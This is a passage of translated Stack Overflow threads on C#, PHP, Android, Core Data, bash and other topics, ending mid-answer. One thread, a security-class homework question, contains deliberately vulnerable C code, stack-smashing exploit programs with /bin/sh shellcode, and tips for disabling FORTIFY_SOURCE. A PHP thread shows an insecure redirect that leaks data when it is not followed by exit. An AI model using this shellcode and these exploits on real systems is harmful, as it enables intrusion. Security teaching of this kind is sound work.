# StackOverflow 问答 14847000-14847999

# c# - 将数据绑定到组合框

> ID：14847001
> 
> 赞同：2
> 
> 时间：2013-02-13T05:31:28.550
> 
> 标签：c#, data-binding, .net-4.0, combobox

在这个加载函数中有一些酒店名称，我想将这些酒店名称绑定到组合框。我走了几个步骤，但我在将值绑定到组合框时遇到了问题。

```
private void myWindow_Load(object sender, EventArgs e)
{
    string new1 = f.Name; //hotel names comes here(eg:hilton,serandib)

    List<string> Hotels = new1 List<string>();
    Hotels.Add(new1);
    foreach (string Hotel in Hotels)
    {

    }
 } 
```

实际上我希望这个酒店名称显示在组合框中。（这是一个 Windows 窗体），请帮我解决剩下的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T05:41:19.593

您可以使用以下代码，

```
ComboBox1.DataSource = hotelList; 
```

如果您有以下字符串来自`f.Name`

“经络，财富，韩亚”

```
 List<String> hotelList = f.Name.Split(',').ToList();

    ComboBox1.DataSource = hotelList; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T05:43:50.213

```
List<Hotels> Hname = new List<Hotels> { "Taj", " Star", "Poorna" ,"Settinad" };
comboBox.DataSource =  Hname; 
```

或者

```
List<Hotels> Hotel = new List<Hotels>();
Hotel.Add( "name");

comboBox.DataSource = Hotel; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T05:56:20.263

```
 List<string> names = new List<string>();
        names.Add("name1");
        names.Add("name2");
        names.Add("name3");
        names.Add("name4");
        names.Add("name5");
        comboBox1.Items.Clear();
        foreach (string name in names)
        {
            comboBox1.Items.Add(name);
        }
        comboBox1.SelectedIndex = 0; //selects first item 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T06:08:14.767

您即将添加一个项目，`ComboBox`但实际上您不需要使用`List<string>`列出项目`ComboBox`，您可以直接`.Items`进入`ComboBox`

```
 string new1 = f.Name; //hotel names comes here(eg:hilton,serandib)
 comboBox5.Items.Add(new1); 
```

# html - HTML 禁用 Drop 事件，div 框子内容重叠

> ID：14847003
> 
> 赞同：0
> 
> 时间：2013-02-13T05:31:35.140
> 
> 标签：html, drag-and-drop, overlap

我在网上按照拖放教程进行操作，并自己进行了一些测试。然后我意识到一个问题：所以我将image1拖到Box A，将image2拖到Box B，然后我尝试将image1从Box A拖到Box B，出现问题。如果我将 image1 放在框 B 的边缘，一切正常，两个图像都在框 B 中，如果我将 image1 放在 image2 的顶部，则 image1 消失了。有谁知道如何防止这种情况？无论我如何丢弃它们，我都希望将两个图像都显示在框中。

我的示例链接：http: [//qcn.freeiz.com/VisTool/DnDrp%20Test.htm](http://qcn.freeiz.com/VisTool/DnDrp%20Test.htm)

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T15:47:55.000

了解[事件冒泡](http://www.quirksmode.org/js/events_order.html)并了解`ev.target`最初是`drop`事件发生的元素，而不是您将侦听器附加到的元素。`ev.target`在做之前检查是什么`appendChild`和`ev.preventDefault()`。 [这是一个简单的例子](http://jsfiddle.net/robertc/arumL/)：

```
function dragDrop(ev) {
    var eleid = ev.dataTransfer.getData("Text");
    var el = ev.target;
    if (el.id != 'dropzone' && el.id != 'dropzone2') {
        el = el.parentNode;
    }
    el.appendChild(document.getElementById(eleid));
    ev.preventDefault();
} 
```

# c# - 将 WCF 协议转换为类

> ID：14847004
> 
> 赞同：2
> 
> 时间：2013-02-13T05:31:35.813
> 
> 标签：c#, wcf, servicecontract

我有具有类似属性的 WCF ServiceContract：

```
int P1 { [OperationContract()] get; [OperationContract()] set; } 
```

我在客户端也需要同样的东西，但生成的协议给了我：

get_P1() 和 set_P1(int) 方法，所以我需要每次手动创建另一个类接口：

```
int P1 { get { return get_P1() } ; set { et_P1(value) ; } 
```

我怎样才能自动化这样的类创建？

原因：我只想编辑界面和实现，其他的东西我想自动生成。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:06:20.443

您可以更改工具（svcutil 或“添加服务参考”）生成合同的方式，但这并不简单。您需要实现 WSDL 导入和代码生成扩展，然后将其连接到工具以在两种方法和属性之间进行转换。[http://blogs.msdn.com/b/carlosfigueira/archive/2011/10/18/wcf-extensibility-wsdl-import-and-code-generation-extensions.aspx](http://blogs.msdn.com/b/carlosfigueira/archive/2011/10/18/wcf-extensibility-wsdl-import-and-code-generation-extensions.aspx)上的帖子包含有关这些扩展的一些信息。

另一种选择是在服务器和客户端之间共享合约——而不是让工具生成客户端代理，您只需在客户端项目中复制（或引用）合约文件。

所以，你可以这样做。但我认为你不应该。属性通常与对象状态的简单访问器相关联。拥有一个`[OperationContract]`属性意味着访问一个属性的行为现在有一个完整的网络往返的潜在成本，加上它需要的任何额外的序列化/打包/框架。方法没有那种隐含的要求，因为它们可以（并且经常这样做）执行多个任务，包括调用其他方法。即使此时在属性访问器中有一个操作合约是有意义的，但几乎没有人接触代码也不是很自然，因此可能会导致将来出现维护问题。

# vba - 从函数返回时未设置对象变量或 With 块变量

> ID：14847008
> 
> 赞同：4
> 
> 时间：2013-02-13T05:31:46.180
> 
> 标签：vba, excel

为什么我收到以下代码 的*Object 变量或 With block variable not set错误：*

```
Function GetConnection() As ADODB.Connection
    'Create connection to worksheet
    Dim cn As ADODB.Connection
    Set cn = New ADODB.Connection
    cn.Provider = "Microsoft.Jet.OLEDB.4.0"
    cn.ConnectionString = "Data Source=" & ThisWorkbook.FullName & ";" & "Extended Properties=Excel 8.0;"
    cn.Open
    GetConnection = cn
End Function 
```

我已经将该对象声明为“cn”，正确初始化它，然后设置一些属性并打开它，然后返回它。

我在 GetConnection = cn 行收到错误。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-13T05:36:03.730

如果记忆对我有用...在经典 vb 中使用引用类型（对象）时，您需要使用“set”关键字

IE：

```
Set GetConnection = cn 
```

这适用于所有赋值，而不仅仅是函数返回语句。

# php - 标头重定向后会执行 PHP 脚本吗？

> ID：14847010
> 
> 赞同：33
> 
> 时间：2013-02-13T05:31:48.643
> 
> 标签：php

是的，以前有人问过这个问题，但是答案并不一致。为什么[我必须在通过 PHP 中的 header('Location..') 重定向后调用'exit'？](https://stackoverflow.com/questions/2747791/why-i-have-to-call-exit-after-redirection-through-headerlocation-in-php)例如。每个答案（包括接受的答案）都表明是，除了最后一个答案是零票，上面写着“也许”。我开始认为正确的答案是“也许”。为了使它成为一个简单的“是”或“否”问题，doThis() 会在给定以下脚本的情况下执行吗？谢谢

```
header('Location: http://somewhereElse.com');
//die();
sleep(1000);
doThis(); 
```

编辑谢谢，所有。使用我的 PHP/Linux/Apache 配置，第二个 syslog() 执行，所以答案是“是的，将执行标头下游的所有脚本”。我会假设（并希望我是正确的）所有 PHP/Linux/Apache 配置都是一样的！

```
<?php
  header('Location: http://google.com');
  syslog(LOG_INFO,'first');  
  sleep(5);
  syslog(LOG_INFO,'Second');  
?> 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-02-13T05:41:25.567

`header('Location: http://google.com')`是的，如果您没有明确终止脚本，则调用后脚本将继续处理！我只是在本地尝试过。我将 test.php 添加到 apache 中的一个站点，其中包含以下内容：

```
<?php

header('Location: http://google.com');
error_log("WE MADE IT HERE SOMEHOW");

?> 
```

并检查了我的 /var/log/apache2/error_log 这个条目：

```
[Tue Feb 12 23:39:23 2013] [error] [client 127.0.0.1] WE MADE IT HERE SOMEHOW 
```

可能令人惊讶，但是是的，如果您不停止执行，它会继续执行。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2015-05-25T03:50:21.673

人们似乎对此感到非常困惑，以及执行脚本的原因。当您发送重定向标头时，浏览器会立即将用户重定向到新页面，但您的服务器将继续处理代码，即使最后没有人接收它，这并不意味着脚本已终止。除非您将 Apache 配置为在发现另一端没有脚本时停止脚本。

当 PHP 脚本正常运行时，NORMAL 状态处于活动状态。如果远程客户端断开连接，则 ABORTED 状态标志打开。远程客户端断开连接通常是由用户点击他的 STOP 按钮引起的。

> 您可以决定是否希望客户端断开连接导致脚本中止。有时，即使没有远程浏览器接收输出，始终让脚本运行完成也很方便。但是，默认行为是在远程客户端断开连接时中止您的脚本。可以通过 `ignore_user_abort`php.ini 指令以及相应的 php_value `ignore_user_abort`Apache httpd.conf 指令或 `ignore_user_abort()`函数来设置此行为。

无需进一步操作即可重定向用户的正确方法是：

```
header("Location: blah.php");
exit(); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-13T05:44:26.123

让我再解释一下。让我们举一个使用会话的例子。

```
$_SESSION["username"] = 'some username';
header("Location: another-file.php");
$_SESSION["username"] = 'replace username';
```

的结果`$_SESSION["username"]`将是`replace username`

您可以输出更多的标头，而不仅仅是`Location`带有标头的标头，其中大多数您不想停止代码执行。如果要停止代码执行，则需要`exit`显式调用。

该`header`命令不会中断您的代码流。即使遇到这种情况，浏览器仍然会下载您的页面，即使它没有显示。考虑`404 pages`，其中（尽管有错误）仍然由浏览器处理（尽管它们在重定向时被渲染）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-13T05:51:34.337

运行代码：

```
//http://www.php.net/manual/en/function.header.php
header('Location: http://google.com');
flush();
sleep(3);

$a=fopen('test.txt', 'w');
fwrite($a,headers_sent());
fclose($a); 
```

在客户端重定向我之前，服务器暂停并写入文件。这是因为，即使在`flush()`ing 缓冲区之后，重定向也不会被处理，直到脚本停止执行（即脚本终止）。该文件*在每种情况下*`test.txt`都有'1' ，这意味着标头已发送，只是在连接终止之前浏览器不处理。

 **   *在任何情况下*，都意味着在 win32 开发机器、linux 开发机器和 linux 生产环境上。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2019-05-21T16:00:42.073

重定向完成后脚本仍将运行。尽管有时它可能有用，但使用`header`函数的人必须意识到它可能很危险。看看这段非常不安全的代码：

```
<?php
if($_GET['some_secret'] != '123') {
    setcookie("status", "not logged in");
    header("Location: /");
}
setcookie("status", "logged in");

echo("Some secret info!")
?> 
```

无论您输入什么*some_secret*，您都将始终拥有一个 cookie，其值为*logged in*。这里唯一的区别是如果给出了错误的参数值，用户将被重定向。

**解决方法：使用`die()`or`exit()`方法在重定向后立即结束脚本**

这个小的更正将使我们的脚本按我们想要的方式工作。

```
<?php
if($_GET['some_secret'] != '123') {
    setcookie("status", "not logged in");
    header("Location: /");
    die();
}
setcookie("status", "logged in");

echo("Some secret info!")
?> 
```

（我不会用`else`语句展示另一个简单的解决方案，因为这不是真正应该这样做的方式。）

* * *

您可能会认为，用户至少不会看到您在屏幕上打印的秘密信息。**错误的！**浏览器只是进行重定向，但我们是否遵循它取决于我们。

在这个例子中，我使用了一个没有漏洞的代码`die`：

```
$ telnet 192.168.1.39 80
Trying 192.168.1.39...
Connected to 192.168.1.39.
Escape character is '^]'.
GET /test.php?some_secret=wrong
Some secret info!
Connection closed by foreign host. 
```

如您所见，秘密信息泄露。

**所以，请注意，这`header`可能非常不安全！**
*...并记住通常不要以明文形式存储密码等数据或登录 cookie 等信息*

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-02-28T17:17:42.160

第一个示例显示在标头位置重定向之后执行了一些代码，但并非所有代码都必须执行。一旦浏览器开始响应重定向标头，它将终止当前页面上的连接，这将导致 PHP 终止执行其代码。这显示了如何不做事。

```
session_start();
$_SESSION["some_value"] = 'original value';
header("Location: /index.php/test2");

$start_time = microtime(true);

for($i = 0; $i <= 100000; $i ++)
{
    password_hash($i);  // slow it down
    $_SESSION["some_value"] = $i;   
    $_SESSION['time'] = microtime(true) - $start_time;
}

$_SESSION['some_value'] = 'finished!';

// Result:
// some_value = 174 
```

在此示例中，我添加了 ignore_user_abort() 以显示如何执行所有代码：

```
ignore_user_abort(TRUE);
session_start();
$_SESSION["some_value"] = 'original value';
header("Location: /index.php/test2");

$start_time = microtime(true);

for($i = 0; $i <= 100000; $i ++)
{
    password_hash($i);  // slow it down
    $_SESSION["some_value"] = $i;   
    $_SESSION['time'] = microtime(true) - $start_time;
}

$_SESSION['some_value'] = 'finished!';

// Result:
// some_value = finished! 
```

这就是您通常执行重定向的方式，方法是在重定向后立即终止脚本：

```
session_start();
$_SESSION["some_value"] = 'original value';
header("Location: /index.php/test2");
die();

$start_time = microtime(true);

for($i = 0; $i <= 100000; $i ++)
{
    password_hash($i);  // slow it down
    $_SESSION["some_value"] = $i;   
    $_SESSION['time'] = microtime(true) - $start_time;
}

$_SESSION['some_value'] = 'finished!';

// Result:
// some_value = original value 
```

简而言之，要么使用 die()，exit()，要么使用 ignore_user_abort(TRUE)；

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-02-13T05:42:34.853

是的，它将在短时间内执行。

> 一旦重定向标头发送到浏览器，浏览器将关闭当前连接并为重定向 URL 打开一个新连接。在关闭原始连接并且 Apache 关闭脚本之前，您的代码将继续像以前一样执行。
> 
> 理论上，如果客户端/服务器之间有足够快的连接，并且管道中没有任何缓冲，则发出标头将导致脚本立即终止。实际上，可以在“现在”和“从不”之间的任何时间启动关闭。

[阅读更多](https://stackoverflow.com/questions/7246649/will-all-code-after-redirect-header-in-php-always-get-executed)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-02-13T05:49:58.857

是的，是的，header 和 php 脚本的任何其他部分一样，它将在脚本执行完成后发送，但是，诀窍是：如果我们要重定向到新的 URL：那么为什么要在 header("location : 网址"); ?>

```
<?php
header('Location: test.php');
header('Location: test.php');
header('Location: test.php');
header('Location: test.php');
header('Location: test.php');
header('Location: test.php');
header('Location: test.php');

$var = 'google.com';
header("Location: http://$var");

?> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-02-10T17:14:12.643

```
header("Location: http://example.com/newURL.php");
die; 
```

是的，脚本在标头重定向后继续，因此请确保调用`die;`或`exit;`在您重定向时停止执行。不需要让脚本进入睡眠状态:)。

[如何在 PHP 中进行重定向？](https://stackoverflow.com/questions/768431/how-to-make-a-redirect-in-php)

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2017-10-17T14:32:42.993

用例场景：将用户重定向到强制门户，然后启动倒数计时器，在 x 分钟后将他们从阻止列表中注销。*

# android - 如何禁用 Android MediaPlayer 调试消息

> ID：14847013
> 
> 赞同：11
> 
> 时间：2013-02-13T05:32:13.920
> 
> 标签：android, media-player, logcat, messages

使用 MediaPlayer 时，我会在 LogCat 中不断重复以下几行调试消息：

```
02-13 14:30:52.090: V/MediaPlayer(21345): getVideoWidth
02-13 14:30:52.090: V/MediaPlayer-JNI(21345): getVideoWidth: 480
02-13 14:30:52.090: V/MediaPlayer(21345): getVideoHeight
02-13 14:30:52.090: V/MediaPlayer-JNI(21345): getVideoHeight: 360
02-13 14:30:52.100: V/MediaPlayer-JNI(21345): isPlaying: 0 
```

我的缓冲区很快就填满了，我错过了其他重要消息。反正有没有禁用这个？在 LogCat 中执行独占过滤器不起作用，因为缓冲区仍然在后台填满。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-05-18T04:09:37.837

`^(?!MediaPlayer)`您可以通过添加到 logcat 过滤器`Log Tag (regex)`字段来删除它： [https ://www.evernote.com/l/ABjh04WocVlGBp_wUBuQyefZIc_9aa8WP8QB/image.png](https://www.evernote.com/l/ABjh04WocVlGBp_wUBuQyefZIc_9aa8WP8QB/image.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T15:03:44.743

我还搜索了这个问题的解决方案，似乎根本不可能......如您所见，没有可用的方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-20T17:09:00.390

这是不可能的，因为大多数都由 C++ 实现记录。正如您[在此处](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.1_r1/android/media/MediaPlayer.java?av=f)看到的，MediaPlayer 是一种通过 Java 调用本地方法的 C++ 包装器。

例如[seekTo(int)](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.1_r1/android/media/MediaPlayer.java#MediaPlayer.seekTo%28int%29)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-22T18:24:39.557

您还可以考虑将日志级别提高到调试。MediaPlayer 吐出的大多数嘈杂的日志记录都被记录为详细。

# python - Python 子进程以不完整的标准输出终止

> ID：14847014
> 
> 赞同：2
> 
> 时间：2013-02-13T05:32:18.753
> 
> 标签：python, process

我在以下 python 脚本代码片段中遇到了问题。

```
 p = subprocess.Popen([cmd,classname],stdout=subprocess.PIPE)
  (stdout, stderr) = p.communicate() 
```

stdout 的长度应该是固定的 7850，但我一直得到的长度（大约 100 左右）远小于这个长度。有人可以解释一下问题是什么吗？

# c - 缓冲区溢出作为 homeowrk

> ID：14847015
> 
> 赞同：5
> 
> 时间：2013-02-13T05:32:20.050
> 
> 标签：c, buffer-overflow, shellcode, stack-smash, fortify-source

仍在为安全类学习此缓冲区溢出内容，我正在尝试利用此应用程序中的漏洞：

```
//vuln.c
#include <stdio.h>

int bof(char *str)
{
     char buffer[12];

     //BO Vulnerability
     strcpy(buffer,str);

     return 1;
}

int main(int argc, char* argv[])
{
     char str[517];

     FILE *badfile;
         badfile = fopen("badfile","r");

     fread(str, sizeof(char),517, badfile);
     bof(str);

     printf("Returned Properly\n");
     return 1;
} 
```

使用此漏洞利用应用程序：

```
//exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char code[] =
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

int main(int argc, char* argv[])
{
    char buffer[517];
    char large_string[512];
    FILE *badfile;
        badfile = fopen("./badfile", "w");

    //NOPslide
    memset(&buffer,0x90,517);

    //BEGIN FILL BUFFER
         //from stack_smashing.pdf
    long *long_ptr = (long *) large_string;

    int i;
    for (i = 0; i < 128; i++) 
        *(long_ptr + i) = (int) buffer;

    for (i = 100; i < strlen(code)+100; i++) 
        large_string[i] = code[i];

    strcpy(buffer,large_string);
    //END FILL BUFFER

    //save buffer to badfile
    fwrite(buffer,517,1,badfile);
    fclose(badfile);

    return 0;
} 
```

出于某种原因，当我通过运行漏洞利用创建坏文件时，它不会向其推送任何内容。缓冲区为空或未正确写入。我似乎找不到我的错误，经过不知疲倦的谷歌搜索，我找不到足够的答案。根据我对我使用的填充缓冲区代码的理解，这应该用我的缓冲区地址填充 long_string，然后将我的 shellcode 放在 long_string 的开头（经过一点 NOOP 幻灯片），然后将 long_string 复制回缓冲区。我真的不认为这个或 fwrite 有任何问题。建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:39:16.317

那么，您需要了解粉碎堆栈的真正作用。它基本上粉碎了很多值并覆盖了一个特定的地址，该地址基本上是堆栈上的返回指针的地址（`$ebp + 4`）。您肯定是在尝试破坏堆栈，但是您必须做很多事情才能准确了解需要用另一个指向您的 shellcode 的地址覆盖的地址。

[http://www.phrack.com/issues.html?issue=49&id=14](http://www.phrack.com/issues.html?issue=49&id=14)

目前你没有这两件事中的任何一件。

您应该使用 gdb 或其他工具来检查实际易受攻击代码的汇编代码并查看返回地址。基于此，您尝试使用命令行粉碎堆栈。

然后你运行你的漏洞利用代码而不破坏堆栈。尝试捕获实际的返回地址，你应该指向你放置 shellcode 的地方。

你应该按照 phrack 的阅读来真正理解粉碎堆栈的概念。希望有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:53:34.183

您的代码中缺少一件非常重要的事情。我会让你自己发现，但我可能会通过查看我在一段时间前解决的一个非常简单的缓冲区溢出问题来帮助你。

考虑这是具有漏洞的目标代码 - 容易缓冲区溢出。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int foo(char *arg)
{
  char buf[200];
  strcpy(buf, arg);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  foo(argv[1]);
  return 0;
} 
```

以下是漏洞利用代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
    char arg1[215] = "";
    memset(arg1,'\x90', 215);
    memcpy(arg1,shellcode,45);

    //0xbffffd78
    //0xbffffcb8

    arg1[212] = '\x88';
    arg1[213] = '\xfc';
    arg1[214] = '\xff';
    arg1[215] = '\xbf';
    char *args[] = { TARGET, arg1, NULL };
    char *env[] = { NULL };

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
} 
```

看看我如何定义我的目标并使用它。

另外，我以前没见过那个 shell 代码。我使用以下（phrack）中的一个：

```
/*
 * Aleph One shellcode.
 */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; 
```

用你的代码检查它，让我知道它是否有效。

还：

```
strcpy(buffer,large_string); 
```

无论您是否接受来自标准输入的 large_string，写这个都是不好的做法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-12T13:12:51.783

> ```
> strcpy(buffer,large_string); 
> ```

在测试期间您需要解决的一件事是这个函数调用。

`memcpy`FORTIFY_SOURCE 使用和等高风险函数的“更安全”变体`strcpy`。当编译器可以推断目标缓冲区大小时，它会使用更安全的变体。如果副本超出目标缓冲区大小，则程序调用`abort()`.

要为您的测试禁用 FORTIFY_SOURCE，您应该使用`-U_FORTIFY_SOURCE`或编译程序`-D_FORTIFY_SOURCE=0`。

# java - getTitle() 无法在 junit @test 注释中获取我的页面标题

> ID：14847019
> 
> 赞同：0
> 
> 时间：2013-02-13T05:32:47.980
> 
> 标签：java, selenium, webdriver, junit4

你好，我是 selenium webdriver 的新手。我想在我的 junit 测试中验证页面标题。但是使用 getTitle() 我能够在 @before 中找到标题，但无法在 @Test 中找到标题。任何人都可以解决这个问题。这是我的代码：包junitTestCase；

```
 import java.util.concurrent.TimeUnit;

    import junit.framework.TestCase;

    import org.junit.After;
    import org.junit.Assert;
    import org.junit.Before;
    import org.junit.BeforeClass;
    import org.junit.Rule;
    import org.junit.Test;
    import org.junit.rules.ErrorCollector;
    import org.openqa.selenium.By;
    import org.openqa.selenium.NoSuchElementException;
    import org.openqa.selenium.WebDriver;
    import org.openqa.selenium.firefox.FirefoxDriver;

   public class TestCase1 extends TestCase
    {

 public static  WebDriver driver;

@Rule
    public ErrorCollector er=new ErrorCollector();

@BeforeClass
  public static void testDraiverConection()
  {

    driver=new FirefoxDriver();
}

@Before
   public void testLogintoApp()
{
    driver.get("http://127.0.0.1/login.do");
    driver.findElement(By.name("username")).sendKeys("admin");
    driver.findElement(By.name("pwd")).sendKeys("manager");
    driver.findElement(By.xpath("//input[@type='submit']")).click();
    driver.manage().timeouts().implicitlyWait(60, TimeUnit.SECONDS);

}
@Test
   public void testTc1()
{

    System.out.println("title is:" + driver.getTitle());
    String expectedResult="actiTIME - Open Tasks";
    String actualResult=driver.getTitle();
    try
    {
    Assert.assertEquals(expectedResult,actualResult);   
    System.out.println("PASS  "+expectedResult+"="+actualResult);
    }
    catch (Exception t)
    {
        er.addError(t);
        System.out.println(t);
    }

}
@Test
    public void testTc2()
{
    driver.findElement(By.xpath("//a[text()='Projects & Customers']")).click();
    try{
    driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);
    }
    catch(NoSuchElementException e){
        er.addError(e);
    }
    String expectedResult="actiTIME - Active Projects & Customers";
    String actualResult=driver.getTitle();
    try
    {
        Assert.assertEquals(expectedResult,actualResult);
        System.out.println("PASS  "+expectedResult+"="+actualResult);
    }
    catch (Throwable t)
    {
        er.addError(t);
        //System.out.print(e.getMessage());
    }
}
@After
 public void testLogout()
{

    driver.findElement(By.xpath("//a/img[@alt='Logout']")).click();
    driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);

}

    } 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T14:42:32.347

删除“扩展测试用例”

junit.framework 包下的类早于 JUnit 4。除非您所在的项目需要使用 JUnit3 风格的测试，否则您应该坚持使用 org.junit 下的 JUnit 类。在同一个测试文件中同时使用 junit.framework 和 org.junit 类会导致奇怪的行为。

# iphone - 将 JSON 保存为核心数据中的字符串

> ID：14847024
> 
> 赞同：2
> 
> 时间：2013-02-13T05:33:11.063
> 
> 标签：iphone, ios, core-data

我正在从 URL 获取数据。数据以 JSON 形式出现。我想将该 JSON 作为字符串保存在 Core Data 中。我怎样才能做到这一点 ？（我的 JSON 是一个 NSDictionary 对象，运行后它说

```
Terminating app due to uncaught exception 'NSInvalidArgumentException',reason:'Unacceptable type of value for attribute: property = "cat_list"; desired type =    NSString; given type = __NSCFDictionary; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:44:05.563

使用[https://github.com/stig/json-framework/](https://github.com/stig/json-framework/)，并为你字典使用

```
NSString* jsonString = [jsonDict JSONRepresentation]; 
```

正如核心数据所期望的那样`NSString`，而不是`NSDictionary`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:19:34.877

您需要将数据转换为字符串并将其存储到核心数据中。

像这样：

```
NSString *jsonString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]; 
```

现在保存`jsonString`到核心数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T07:32:10.180

您可以将核心数据模型中的属性类型指定为**Transformable**，然后直接将 NSDictionary 对象传递给它。

如果您正在创建一个`NSManagedObject`子类来处理对象，该属性将作为`id`您的子类中的类型出现（您可以选择将其更改为`NSDictionary`在以后访问对象时直接使用对象上的字典函数）。

注意：这是一种替代解决方案，不会将字典对象转换为字符串。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-14T13:19:58.790

请注意，JSON 规范声明键的顺序不是固定的。结果是键会不时混合，这使得使用谓词检索 JSON 对象变得不可能。在使用 NSJsonSerialization 生成用于在 Core Data 中存储/检索的 NSString 后，我遇到了这个问题：键的顺序每次都不同，因此我无法检查该 JSON 消息是否已经存在。

另请参阅[https://stackoverflow.com/a/15125704/876903](https://stackoverflow.com/a/15125704/876903)。

我决定创建一个 NSDictionary 类别，将所有键和值递归地放入有序数组中，然后用于查看与核心数据对象中的这些 NSString 一起存储的 NSDictionary 对象是否已经存储。

因此，我的核心数据对象包含：

*   键（排序的 NSString）
*   值（排序的 NSString）
*   消息（可转换的 NSDictionary）

我会使用谓词来查看 JSON 对象是否像这样存在：

```
[NSPredicate predicateWithFormat:@"(keys == %@) AND (values == %@)", sortedKeys, sortedValues]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-09-01T23:00:44.443

运行函数 testThis() 来查看这一切。self.user.jsonTest 是一个可转换类型的核心数据变量。将其替换为任何可转换的 CoreData 变量，并且 storeJSON 和检索 JSON 应该可以工作。我正在使用 swiftyJSON，但如果你不使用它应该非常容易删除它。

```
func testThis() {
    makeFakeData() {
        self.retrieveJSON(self.user.jsonTest) {
            json in
            print("json: \(json)")
        }
    }
}

func storeJSON(dataToStore: [String: AnyObject], completion: (data: NSData?) -> Void) {
    do {
        let data = try NSJSONSerialization.dataWithJSONObject(dataToStore, options: [])
        completion(data: data)
    } catch let error as NSError {
        print("NSJSONSerialization Error: \(error)")
        completion(data: nil)
    }
}

func retrieveJSON(dataToGet: NSObject?, completion: (json: JSON?) -> Void) {
    if let data = dataToGet as? NSData {
        do {
            let nsJSON = try NSJSONSerialization.JSONObjectWithData(data, options: [])
            completion(json: JSON(nsJSON))
        } catch let error as NSError {
            print("NSJSONSerialization Error: \(error)")
            completion(json: nil)
        }
    }
}

func makeFakeData(completion: () -> Void) {
    var solarResourceDic: [String: String] = [:]
    var srDics: [[String: String]!] = []

    for i in 0..<5 {
        solarResourceDic = [:]
        solarResourceDic["system_capacity"] = "\(i)"
        solarResourceDic["azimuth"] = "\(i + 1)"
        solarResourceDic["tilt"] = "\(i + 2)"
        solarResourceDic["array_type"] = "\(i + 3)"
        solarResourceDic["module_type"] = "\(i + 4)"
        solarResourceDic["losses"] = "\(i + 5)"
        srDics.append(solarResourceDic)
    }
    let dic = ["Solar Resource": srDics]

    storeJSON(dic) {
        data in
        self.user.jsonTest = data
        appDelegate.coreData.saveContext()
    }
    completion()
} 
```

# linux - 如何正确循环这个 BASH 语句？

> ID：14847027
> 
> 赞同：3
> 
> 时间：2013-02-13T05:33:18.200
> 
> 标签：linux, bash

在我制作的这行代码上使用的最佳循环是什么，它通过日志文件并找到失败的行`$6`？对 BASH 和 LINUX 来说非常新鲜，无法让任何循环正常工作。

```
Sep 13 12:09:39 icarus sshd[14043]: Failed none for invalid user 55659
Sep 13 12:09:43 icarus sshd[14043]: pam_unix(sshd:auth): check pass; user unknown
Sep 13 12:09:43 icarus sshd[14043]: pam_unix(sshd:auth):
Sep 13 12:09:44 icarus sshd[14043]: Failed password for invalid user 55659
Sep 13 12:09:48 icarus sshd[14043]: pam_unix(sshd:auth): check pass; user unknown
Sep 13 12:09:50 icarus sshd[14043]: Failed password for invalid user 55659 from 
```

示例命令

```
cat auth.log | sed -e 's/,//g' | awk -F" " '{print $6}' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:06:36.463

```
$ grep Failed auth.log
Sep 13 12:09:39 icarus sshd[14043]: Failed none for invalid user 55659
Sep 13 12:09:44 icarus sshd[14043]: Failed password for invalid user 55659
Sep 13 12:09:50 icarus sshd[14043]: Failed password for invalid user 55659 from 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:07:17.730

如果你想使用 awk：

```
